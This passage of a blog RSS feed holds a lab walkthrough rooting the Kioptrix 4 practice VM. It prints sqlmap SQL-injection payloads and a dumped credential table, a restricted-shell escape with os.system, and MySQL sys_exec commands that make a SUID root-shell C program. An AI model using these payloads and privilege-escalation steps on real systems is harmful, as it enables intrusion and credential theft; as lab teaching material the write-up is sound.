+[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 10 columns&#39;
+[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 11 to 20 columns&#39;
+[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 11 to 20 columns&#39;
+[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 30 columns&#39;
+[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 30 columns&#39;
+[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 31 to 40 columns&#39;
+[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 31 to 40 columns&#39;
+[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 50 columns&#39;
+[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 50 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 1 to 10 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 11 to 20 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 11 to 20 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 21 to 30 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 21 to 30 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 31 to 40 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 31 to 40 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 41 to 50 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 41 to 50 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 1 to 10 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 1 to 10 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 11 to 20 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 11 to 20 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 21 to 30 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 21 to 30 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 31 to 40 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 31 to 40 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 41 to 50 columns&#39;
+[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 41 to 50 columns&#39;
+[20:42:43] [INFO] checking if the injection point on POST parameter &#39;myusername&#39; is a false positive
+[20:42:43] [WARNING] false positive injection point detected
+[20:42:43] [WARNING] POST parameter &#39;myusername&#39; is not injectable
+[20:42:43] [INFO] testing if POST parameter &#39;mypassword&#39; is dynamic
+[20:42:43] [WARNING] POST parameter &#39;mypassword&#39; appears to be not dynamic
+[20:42:43] [INFO] heuristic test shows that POST parameter &#39;mypassword&#39; might be injectable (possible DBMS: MySQL)
+[20:42:43] [INFO] testing sql injection on POST parameter &#39;mypassword&#39;
+[20:42:43] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+sqlmap got a 302 redirect to &#39;http://192.168.95.131:80/login_success.php&#39;. What do you want to do? 
+[1] Follow the redirection (default)
+[2] Stay on the original page
+[3] Ignore
+&amp;gt; 2
+[20:42:50] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
+[20:42:51] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause&#39;
+[20:42:51] [INFO] POST parameter &#39;mypassword&#39; is &#39;OR boolean-based blind - WHERE or HAVING clause&#39; injectable 
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 4.1 AND error-based - WHERE or HAVING clause&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 OR error-based - WHERE or HAVING clause&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 4.1 OR error-based - WHERE or HAVING clause&#39;
+[20:42:51] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 stacked queries&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 stacked queries (heavy query)&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind (comment)&#39;
+[20:42:51] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39;
+[20:43:03] [INFO] POST parameter &#39;mypassword&#39; is &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39; injectable 
+[20:43:03] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39;
+[20:43:03] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for UNION query injection technique
+[20:43:03] [INFO] target url appears to have 3 columns in query
+[20:43:04] [WARNING] if UNION based SQL injection is not detected, please consider usage of option &#39;--union-char&#39; (e.g. --union-char=1) and/or try to force the back-end DBMS (e.g. --dbms=mysql) 
+[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 10 columns&#39;
+[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 11 to 20 columns&#39;
+[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 11 to 20 columns&#39;
+[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 30 columns&#39;
+[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 30 columns&#39;
+[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 31 to 40 columns&#39;
+[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 31 to 40 columns&#39;
+[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 50 columns&#39;
+[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 50 columns&#39;
+[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
+[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 1 to 10 columns&#39;
+[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 11 to 20 columns&#39;
+[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 11 to 20 columns&#39;
+[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 21 to 30 columns&#39;
+[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 21 to 30 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NULL) - 31 to 40 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (random number) - 31 to 40 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NULL) - 41 to 50 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (random number) - 41 to 50 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 1 to 10 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 1 to 10 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 11 to 20 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 11 to 20 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 21 to 30 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 21 to 30 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 31 to 40 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 31 to 40 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 41 to 50 columns&#39;
+[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 41 to 50 columns&#39;
+[20:43:05] [WARNING] in OR boolean-based injections, please consider usage of switch &#39;--drop-set-cookie&#39; if you experience any problems during data retrieval
+POST parameter &#39;mypassword&#39; is vulnerable. Do you want to keep testing the others? [Y/n] n
+sqlmap identified the following injection points with a total of 3697 HTTP(s) requests:
+---
+Place: POST
+Parameter: mypassword
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: myusername=admin&amp;amp;mypassword=-5618&#39; OR NOT (5039=5039) AND &#39;Gndx&#39;=&#39;Gndx&amp;amp;Submit=Login
+
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)
+    Payload: myusername=admin&amp;amp;mypassword=admin&#39; AND 9312=BENCHMARK(5000000,MD5(0x57485477)) AND &#39;lxSR&#39;=&#39;lxSR&amp;amp;Submit=Login
+---
+
+[20:43:11] [INFO] testing MySQL
+[20:43:11] [INFO] confirming MySQL
+[20:43:11] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL &amp;gt;= 5.0.0
+[20:43:11] [INFO] fetching database names
+[20:43:11] [INFO] fetching number of databases
+[20:43:11] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval
+[20:43:11] [INFO] retrieved: 3
+[20:43:11] [INFO] retrieved: information_schema
+[20:43:12] [INFO] retrieved: members
+[20:43:13] [INFO] retrieved: mysql
+available databases [3]:
+[*] information_schema
+[*] members
+[*] mysql
+
+[20:43:13] [INFO] Fetched data logged to text files under &#39;/pentest/database/sqlmap/output/192.168.95.131&#39;
+
+[*] shutting down at 20:43:13
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;During this run, you can see that it prompted me only 2 times.  Once because it was redirected, and asked if I wanted to stay on the same page or follow the redirect.  Another because it found that &amp;ldquo;mypassword&amp;rdquo; was injectable, and wanted to know if I wanted to try some others.  I didn&amp;rsquo;t care about any other pages, or any other variables if the first one worked.&lt;/p&gt;
+
+&lt;p&gt;This gave me 3 MySQL databases, &amp;ldquo;information_schema&amp;rdquo;, &amp;ldquo;mysql&amp;rdquo;, and &amp;ldquo;members&amp;rdquo;.  The first two are default in MySQL installations, but the last probably has to do with the Kioptrix VM.  So I decided to go further with the &amp;ldquo;members&amp;rdquo; database.  I opted to dump all the data in the &amp;ldquo;members&amp;rdquo; database.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;quot; --level=5 --risk=3 -D members --dump
+
+    sqlmap/1.0-dev (r4739) - automatic SQL injection and database takeover tool
+    http://www.sqlmap.org
+
+[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 20:48:45
+
+[20:48:46] [INFO] using &#39;/pentest/database/sqlmap/output/192.168.95.131/session&#39; as session file
+[20:48:46] [INFO] resuming injection data from session file
+[20:48:46] [INFO] resuming back-end DBMS &#39;mysql 5&#39; from session file
+[20:48:46] [INFO] testing connection to the target url
+[20:48:46] [INFO] heuristics detected web page charset &#39;ascii&#39;
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: POST
+Parameter: mypassword
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: myusername=admin&amp;amp;mypassword=-5618&#39; OR NOT (5039=5039) AND &#39;Gndx&#39;=&#39;Gndx&amp;amp;Submit=Login
+
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)
+    Payload: myusername=admin&amp;amp;mypassword=admin&#39; AND 9312=BENCHMARK(5000000,MD5(0x57485477)) AND &#39;lxSR&#39;=&#39;lxSR&amp;amp;Submit=Login
+---
+
+[20:48:46] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL 5
+[20:48:46] [INFO] fetching tables for database: members
+[20:48:46] [INFO] fetching number of tables for database &#39;members&#39;
+[20:48:46] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval
+sqlmap got a 302 redirect to &#39;http://192.168.95.131:80/login_success.php&#39;. What do you want to do? 
+[1] Follow the redirection (default)
+[2] Stay on the original page
+[3] Ignore
+&amp;gt; 2
+1
+[20:48:48] [INFO] retrieved: members
+[20:48:48] [INFO] fetching columns for table &#39;members&#39; on database &#39;members&#39;
+[20:48:48] [INFO] retrieved: 3
+[20:48:48] [INFO] retrieved: id
+[20:48:49] [INFO] retrieved: username
+[20:48:49] [INFO] retrieved: password
+[20:48:50] [INFO] fetching entries for table &#39;members&#39; on database &#39;members&#39;
+[20:48:50] [INFO] fetching number of entries for table &#39;members&#39; on database &#39;members&#39;
+[20:48:50] [INFO] retrieved: 2
+[20:48:50] [INFO] retrieved: 1
+[20:48:50] [INFO] retrieved: MyNameIsJohn
+[20:48:51] [INFO] retrieved: john
+[20:48:51] [INFO] retrieved: 2
+[20:48:51] [INFO] retrieved: ADGAdsafdfwt4gadfga==
+[20:48:52] [INFO] retrieved: robert
+[20:48:52] [INFO] analyzing table dump for possible password hashes
+Database: members
+Table: members
+[2 entries]
++----+-----------------------+----------+
+| id | password              | username |
++----+-----------------------+----------+
+| 1  | MyNameIsJohn          | john     |
+| 2  | ADGAdsafdfwt4gadfga== | robert   |
++----+-----------------------+----------+
+
+[20:48:52] [INFO] Table &#39;members.members&#39; dumped to CSV file &#39;/pentest/database/sqlmap/output/192.168.95.131/dump/members/members.csv&#39;
+[20:48:52] [INFO] Fetched data logged to text files under &#39;/pentest/database/sqlmap/output/192.168.95.131&#39;
+
+[*] shutting down at 20:48:52
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So there we have some credentials!  When I tried these on the login page, both of them worked!  However, it was a dead end, as it just showed me the usernames and passwords that I just entered.&lt;/p&gt;
+
+&lt;p&gt;On a whim, I tried using the first login to ssh in, and it worked!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ssh john@192.168.95.131
+john@192.168.95.131&#39;s password: 
+Welcome to LigGoat Security Systems - We are Watching
+== Welcome LigGoat Employee ==
+LigGoat Shell is in place so you  don&#39;t screw up
+Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands
+john:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So I guess that was good news.  However the bad news was that it was in a form of a restricted shell.  I was not familiar with the &amp;ldquo;LigGoat Shell&amp;rdquo;.  However, it seemed somewhat limiting.  It only allowed the commands of, &amp;ldquo;cd&amp;rdquo;, &amp;ldquo;clear&amp;rdquo;, &amp;ldquo;echo&amp;rdquo;, &amp;ldquo;exit&amp;rdquo;, &amp;ldquo;help&amp;rdquo;, &amp;ldquo;ll&amp;rdquo;, &amp;ldquo;lpath&amp;rdquo;, and &amp;ldquo;ls&amp;rdquo;.  Like most other restricted shells that I&amp;rsquo;ve ran into in the past, it would not let you pipe things, or access items outside your folder.  So if you did a &amp;ldquo;ls ../&amp;rdquo;, it would not work.  However, unlike other shells, this one would actually disconnect you after a single warning of violating these rules!  Luckily, in my searching for methods to break out of a restricted shell, I found a great article on my buddy, g0tmi1k&amp;rsquo;s site, &lt;a href=&#34;http://g0tmi1k.blogspot.com/2011/08/basic-linux-privilege-escalation.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;john:~$ echo os.system(&#39;/bin/bash&#39;)
+john@Kioptrix4:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I now had an unrestricted bash shell.  I was still limited to the &amp;ldquo;john&amp;rdquo; user, which seemed to have normal user privileges.  The next step was to escalate to root privileges.  I started with looking at what was running.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1   2844  1696 ?        Ss   Feb11   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [migration/0]
+root         4  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [watchdog/0]
+root         6  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [events/0]
+root         7  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [khelper]
+root        41  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kblockd/0]
+root        44  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kacpid]
+root        45  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kacpi_notify]
+root       180  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kseriod]
+root       219  0.0  0.0      0     0 ?        S    Feb11   0:00 [pdflush]
+root       220  0.0  0.0      0     0 ?        S    Feb11   0:00 [pdflush]
+root       221  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kswapd0]
+root       263  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [aio/0]
+root      1489  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ata/0]
+root      1492  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ata_aux]
+root      1501  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_0]
+root      1502  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_1]
+root      1520  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ksuspend_usbd]
+root      1526  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [khubd]
+root      2401  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_2]
+root      2641  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kjournald]
+root      2808  0.0  0.0   2224   652 ?        S&amp;lt;s  Feb11   0:00 /sbin/udevd --daemon
+root      3099  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kgameportd]
+root      3236  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kpsmoused]
+root      3974  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [btaddconn]
+root      3978  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [btdelconn]
+root      4614  0.0  0.0   1716   488 tty4     Ss+  Feb11   0:00 /sbin/getty 38400 tty4
+root      4616  0.0  0.0   1716   488 tty5     Ss+  Feb11   0:00 /sbin/getty 38400 tty5
+root      4622  0.0  0.0   1716   484 tty2     Ss+  Feb11   0:00 /sbin/getty 38400 tty2
+root      4626  0.0  0.0   1716   488 tty3     Ss+  Feb11   0:00 /sbin/getty 38400 tty3
+root      4630  0.0  0.0   1716   488 tty6     Ss+  Feb11   0:00 /sbin/getty 38400 tty6
+syslog    4663  0.0  0.0   1936   652 ?        Ss   Feb11   0:00 /sbin/syslogd -u syslog
+root      4682  0.0  0.0   1872   540 ?        S    Feb11   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
+klog      4684  0.0  0.1   3160  2064 ?        Ss   Feb11   0:00 /sbin/klogd -P /var/run/klogd/kmsg
+root      4703  0.0  0.0   5316   988 ?        Ss   Feb11   0:00 /usr/sbin/sshd
+root      4759  0.0  0.0   1772   524 ?        S    Feb11   0:00 /bin/sh /usr/bin/mysqld_safe
+root      4876  0.0  0.1   6528  1332 ?        Ss   Feb11   0:00 /usr/sbin/nmbd -D
+root      4878  0.0  0.2  10108  2544 ?        Ss   Feb11   0:00 /usr/sbin/smbd -D
+root      4892  0.0  0.0  10108  1028 ?        S    Feb11   0:00 /usr/sbin/smbd -D
+root      4893  0.0  0.1   8084  1336 ?        Ss   Feb11   0:00 /usr/sbin/winbindd
+root      4900  0.0  0.1   8084  1160 ?        S    Feb11   0:00 /usr/sbin/winbindd
+daemon    4914  0.0  0.0   1984   472 ?        Ss   Feb11   0:00 /usr/sbin/atd
+root      4925  0.0  0.0   2104   884 ?        Ss   Feb11   0:00 /usr/sbin/cron
+root      4947  0.0  0.5  20464  6188 ?        Ss   Feb11   0:01 /usr/sbin/apache2 -k start
+www-data  4979  0.0  0.5  20596  5700 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
+www-data  4980  0.0  0.5  20596  5740 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
+www-data  4981  0.0  0.5  20612  5604 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
+www-data  4982  0.0  0.5  20612  5684 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
+www-data  4983  0.0  0.5  20612  5740 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
+dhcp      4996  0.0  0.0   2440   792 ?        Ss   Feb11   0:00 dhclient eth1
+root      5003  0.0  0.0   1716   492 tty1     Ss+  Feb11   0:00 /sbin/getty 38400 tty1
+www-data  5015  0.0  0.5  20612  5628 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
+www-data  5019  0.0  0.5  20856  5832 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
+root      5486  0.0  0.0   8084   868 ?        S    Feb11   0:00 /usr/sbin/winbindd
+root      5487  0.0  0.1   8092  1260 ?        S    Feb11   0:00 /usr/sbin/winbindd
+root      5488  0.0  0.3  11360  3736 ?        Ss   Feb11   0:00 sshd: john [priv]
+john      5490  0.0  0.1  11512  1912 ?        S    Feb11   0:00 sshd: john@pts/0 
+john      5491  0.0  0.3   5888  3796 pts/0    Ss   Feb11   0:00 python /bin/kshell
+john      5492  0.0  0.0   1772   488 pts/0    S    Feb11   0:00 sh -c /bin/bash
+john      5493  0.0  0.2   5444  2892 pts/0    S    Feb11   0:00 /bin/bash
+libuuid   6315  0.0  0.0   2004   300 ?        Ss   Feb11   0:00 uuidd
+root     11581  0.5  1.9 126992 20404 ?        Sl   Feb11   0:14 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=330
+root     11583  0.0  0.0   1700   560 ?        S    Feb11   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
+root     11663  0.0  0.0   1564   296 pts/0    S    Feb11   0:00 ./exploit
+root     11664  0.0  0.0   1772   484 pts/0    S    Feb11   0:00 sh -c /bin/bash
+root     11665  0.0  0.2   4924  2572 pts/0    S+   Feb11   0:00 /bin/bash
+root     11725  0.0  0.3  11360  3720 ?        Ss   00:16   0:00 sshd: john [priv]
+john     11727  0.0  0.1  11512  1872 ?        R    00:16   0:00 sshd: john@pts/1 
+john     11728  0.0  0.3   5964  3844 pts/1    Ss   00:16   0:00 python /bin/kshell
+john     11732  0.0  0.0   1772   484 pts/1    S    00:20   0:00 sh -c /bin/bash
+john     11733  0.0  0.2   5432  2852 pts/1    R    00:20   0:00 /bin/bash
+john     11754  0.0  0.0   2644  1008 pts/1    R+   00:22   0:00 ps aux
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I couldn&amp;rsquo;t help but notice that MySQL was running as &amp;ldquo;root&amp;rdquo;.  This is typically a no-no, so I attempted to make it my target.  I attempted to login with the root user, and a blank password:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ mysql -u root -h localhost
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 4999
+Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the buffer.
+
+mysql&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I figured if it was running as root, I would try running some system commands.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT sys_exec(&#39;touch /tmp/thisisatest&#39;);
++------------------------------------+
+| sys_exec(&#39;touch /tmp/thisisatest&#39;) |
++------------------------------------+
+| NULL                               | 
++------------------------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And then to verify that it ran successfully:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ ls -al /tmp
+total 12
+drwxrwxrwt  3 root root 4096 2012-02-12 00:28 .
+drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
+-rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
+drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That was a very good sign!  I decided my method of exploitation would be to use a C program, set it to SUID root, and run it.  I used this C program that I have used many times before.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;int main()
+{
+    setresuid(0, 0, 0);
+    setresgid(0, 0, 0);
+    system( &amp;quot;/bin/bash&amp;quot; );
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then compiled it.  Note that gcc was not installed, and cpp gave me issues, so I compiled it on the BackTrack VM, and then SFTP&amp;rsquo;d the file over.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@bt:~# gcc -o exploit exploit.c
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ scp root@192.168.95.136:exploit exploit
+root@192.168.95.136&#39;s password: 
+exploit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then used MySQL to set it to SUID and executable.  Before that, I&amp;rsquo;d have to chown it to root, so that the SUID would actually be useful.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ mysql -u root -h localhost
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 5001
+Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the buffer.
+
+mysql&amp;gt; SELECT sys_exec(&#39;chown root.root /tmp/exploit&#39;);
++------------------------------------------+
+| sys_exec(&#39;chown root.root /tmp/exploit&#39;) |
++------------------------------------------+
+| NULL                                     | 
++------------------------------------------+
+1 row in set (0.01 sec)
+
+mysql&amp;gt; SELECT sys_exec(&#39;chmod +s,a+rwx /tmp/exploit&#39;);
++-----------------------------------------+
+| sys_exec(&#39;chmod +s,a+rwx /tmp/exploit&#39;) |
++-----------------------------------------+
+| NULL                                    | 
++-----------------------------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The /tmp folder now looked like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ ls -al
+total 20
+drwxrwxrwt  3 root root 4096 2012-02-12 00:31 .
+drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
+-rwsrwsrwx  1 root root  166 2012-02-12 00:31 exploit
+-rw-r--r--  1 john john  103 2012-02-12 00:31 exploit.c
+-rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
+drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From there, it was just as simple as running the exploit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ ./exploit 
+root@Kioptrix4:/tmp# id
+uid=0(root) gid=0(root) groups=1001(john)
+root@Kioptrix4:/tmp# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And there you have it, root access!&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Protostar Net 3</title>
+      <link>https://www.mattandreko.com/blog/2012-02-11-exploit-exercises-protostar-net-3/</link>
+      <pubDate>Sat, 11 Feb 2012 10:11:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-02-11-exploit-exercises-protostar-net-3/</guid>
